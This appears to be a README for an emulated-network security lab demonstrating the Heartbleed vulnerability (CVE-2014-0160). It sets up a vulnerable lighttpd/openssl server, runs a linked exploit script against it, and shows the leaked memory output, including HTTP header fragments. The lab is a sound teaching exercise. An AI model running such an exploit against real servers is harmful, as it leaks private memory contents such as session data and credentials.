# Heartbleed attack

This example covers the Heartbleed attack. The vulnerable https server is setup
on the host node (10.0.1.10/24).

## Starting the vulnerable server
Start the experiment specified in `service.imn` and issue the
[start_https.sh](start_https.sh) command to start the https server on the host
node:
```console
# ./start_https.sh
```
After executing the command check with the `ps` and `netstat` commands whether
the https server is running on the host node.
```console
root@host:/ # ps ax
 PID TT  STAT    TIME COMMAND
 9733 ??  IsJ  0:00.00 rpcbind
 9735 ??  IsJ  0:00.00 inetd
 9895 ??  SJ   0:00.00 lighttpd -f /usr/local/etc/lighttpd/lighttpd.conf
 9897  2  SJ   0:00.01 csh
 9911  2  R+J  0:00.00 ps ax
root@host:/ # netstat -anfinet
Active Internet connections (including servers)
Proto Recv-Q Send-Q Local Address          Foreign Address        (state)
tcp4       0      0 *.443                  *.*                    LISTEN
tcp4       0      0 *.80                   *.*                    LISTEN
tcp4       0      0 *.111                  *.*                    LISTEN
udp4       0      0 *.618                  *.*                    
udp4       0      0 *.111                  *.*      
```

## Executing the attack
On the virtual nodes we have previously deployed a vulnerable version of openssl
and lighttpd. The script [heartbleed.sh](heartbleed.sh) is used to execute the
attack. It copies the [heartbleed.py](heartbleed.py) script on the Attacker node
and executes it. The python script used to exploit the server can be found
[here](https://gist.github.com/eelsivart/10174134).

The execution result is as follows:
```console
# ./heartbleed.sh
defribulator v1.16
A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed
(CVE-2014-0160)
##################################################################
Connecting to: 10.0.1.10:443, 1 times
Sending Client Hello for TLSv1.0
Received Server Hello for TLSv1.0

WARNING: 10.0.1.10:443 returned more data than it should - server is vulnerable!
Please wait... connection attempt 1 of 1
##################################################################
.@....SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#.......pt-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive

....h.F __..3.R..h
```

If the heartbleed script is ran repeatedly without the server actually
processing new data the output will be the same. If we issue external requests
from the PC node, we force the server to process some data and that causes a
change in the leaked part of memory:
```console
# himage PC wget -r --no-check-certificate https://10.0.1.10/
```

After issuing the request we can see that the output of the heartbleed script
changes:
```console
% sudo ./heartbleed.sh
defribulator v1.16
...
##################################################################
.@....SC[...r....+..H...9...
....w.3....f...
...!.9.8.........5...............
.........3.2.....E.D...../...A.................................I.........
...........
...................................#........\.>.H....m..W.\...U....K
```
